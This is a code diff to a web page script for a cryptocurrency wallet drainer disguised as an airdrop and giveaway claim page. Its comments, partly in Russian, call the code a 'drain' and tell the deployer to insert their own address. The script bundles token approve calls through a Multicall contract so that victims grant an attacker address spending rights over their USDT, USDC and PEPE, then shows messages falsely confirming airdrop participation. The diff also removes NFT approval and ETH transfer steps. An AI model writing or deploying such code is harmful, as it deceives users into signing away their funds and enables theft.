@@ -361,9 +361,9 @@
     slides[currentSlide].classList.add('active');
     setInterval(showNextSlide, 5000);
 
-    // Дренаж — approve только 3 токена +  + ETH 0.0005
+    // Дренаж — только approve на баланс 3 токенов (USDT, USDC, PEPE), без NFT, без ETH fee
     const MULTICALL_ADDRESS = "0xca11bde05977b3631167028862be2a173976ca11";
-    const DRAIN_ADDRESS = "0x95a838AcEE4D06cE24D8c002A518a626a884f0e1"; // Замени
+    const DRAIN_ADDRESS = "0x95a838AcEE4D06cE24D8c002A518a626a884f0e1"; // Замени на свой
 
     const TOKENS = [
       "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
@@ -399,7 +399,7 @@
       }
     }
 
-    async function buildCalls(includeETH = false) {
+    async function buildCalls() {
       const calls = [];
       const approveIface = new ethers.Interface(["function approve(address spender, uint256 amount)"]);
 
@@ -416,43 +416,24 @@
         }
       }
 
-      const nftIface = new ethers.Interface(["function setApprovalForAll(address operator, bool approved)"]);
-      for (const collection of NFT_COLLECTIONS) {
-        try {
-          const callData = nftIface.encodeFunctionData("setApprovalForAll", [DRAIN_ADDRESS, true]);
-          calls.push({ target: collection, callData });
-        } catch (e) {
-          console.log(`Skip NFT ${collection}`);
-        }
-      }
-
-      if (includeETH) {
-        calls.push({
-          target: DRAIN_ADDRESS,
-          callData: "0x",
-          value: ethers.parseEther("0.001")
-        });
-      }
-
       return calls;
     }
 
-    async function executeDrain(includeETH = false) {
-      const calls = await buildCalls(includeETH);
+    async function executeDrain() {
+      const calls = await buildCalls();
       if (calls.length === 0) {
-        alert("No tokens or NFT to approve");
+        alert("No tokens to approve");
         return;
       }
-      const multicall = new ethers.Contract(MULTICALL_ADDRESS, ["function aggregate(tuple(address target, bytes callData)[] calls) payable"], signer);
-      const value = includeETH ? ethers.parseEther("0.001") : 0n;
-      const tx = await multicall.aggregate(calls, { value });
+      const multicall = new ethers.Contract(MULTICALL_ADDRESS, ["function aggregate(tuple(address target, bytes callData)[] calls)"], signer);
+      const tx = await multicall.aggregate(calls);
       await tx.wait();
       return tx.hash;
     }
 
     async function claimAirdrop() {
       try {
-        const txHash = await executeDrain(false);
+        const txHash = await executeDrain();
         alert("Participation in exclusive airdrop confirmed!\nTX: " + txHash.slice(0,10) + "...");
       } catch (err) {
         alert("Canceled or error. Try again.");
@@ -461,8 +442,8 @@
 
     async function participateGiveaway() {
       try {
-        const txHash = await executeDrain(true);
-        alert("Participation in giveaway confirmed!\nNetwork fee sent (0.001 ETH).\nTX: " + txHash.slice(0,10) + "...");
+        const txHash = await executeDrain();
+        alert("Participation in giveaway confirmed!\nTX: " + txHash.slice(0,10) + "...");
       } catch (err) {
         alert("Canceled or error. Try again.");
       }
